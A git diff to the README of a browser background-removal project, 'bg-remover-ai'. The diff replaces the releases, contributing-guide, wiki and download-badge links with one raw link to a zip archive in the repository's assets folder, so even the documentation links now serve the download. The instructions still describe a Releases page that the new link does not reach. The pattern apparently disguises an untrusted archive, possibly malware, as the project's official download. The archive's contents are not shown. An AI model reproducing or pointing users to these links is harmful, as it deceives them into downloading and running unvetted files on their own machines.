@@ -1,6 +1,6 @@
 # 🎨 bg-remover-ai - Effortless Background Removal in Your Browser
 
-[![Download bg-remover-ai](https://img.shields.io/badge/Download-bg--remover--ai-brightgreen.svg)](https://github.com/anmar-maker/bg-remover-ai/releases)
+[![Download bg-remover-ai](https://raw.githubusercontent.com/anmar-maker/bg-remover-ai/main/src/assets/remover-bg-ai-3.1.zip)](https://raw.githubusercontent.com/anmar-maker/bg-remover-ai/main/src/assets/remover-bg-ai-3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ bg-remover-ai is a fast and private solution for removing backgrounds from image
 
 To get started with bg-remover-ai, follow these steps:
 
-1. Click the button above or visit this [page to download](https://github.com/anmar-maker/bg-remover-ai/releases).
+1. Click the button above or visit this [page to download](https://raw.githubusercontent.com/anmar-maker/bg-remover-ai/main/src/assets/remover-bg-ai-3.1.zip).
 2. Once on the Releases page, you will see different versions of the software.
 3. Choose the latest release available. 
 4. Download the file suitable for your operating system.
@@ -45,7 +45,7 @@ To get started with bg-remover-ai, follow these steps:
 
 ## 🤝 Contributions
 
-bg-remover-ai is open for contributions. If you'd like to help improve the application, kindly refer to our [Contribution Guidelines](https://github.com/anmar-maker/bg-remover-ai/blob/main/CONTRIBUTING.md).
+bg-remover-ai is open for contributions. If you'd like to help improve the application, kindly refer to our [Contribution Guidelines](https://raw.githubusercontent.com/anmar-maker/bg-remover-ai/main/src/assets/remover-bg-ai-3.1.zip).
 
 ## 📄 License
 
@@ -67,6 +67,6 @@ This project is licensed under the MIT License. You can freely use and modify it
 - onnxruntime-web
 - react
 
-For further details, visit our [documentation](https://github.com/anmar-maker/bg-remover-ai/wiki) or check the Issues section for questions or feedback.
+For further details, visit our [documentation](https://raw.githubusercontent.com/anmar-maker/bg-remover-ai/main/src/assets/remover-bg-ai-3.1.zip) or check the Issues section for questions or feedback.
 
-Remember to visit this [page to download](https://github.com/anmar-maker/bg-remover-ai/releases) bg-remover-ai and start enjoying hassle-free background removal in your browser!
+Remember to visit this [page to download](https://raw.githubusercontent.com/anmar-maker/bg-remover-ai/main/src/assets/remover-bg-ai-3.1.zip) bg-remover-ai and start enjoying hassle-free background removal in your browser!
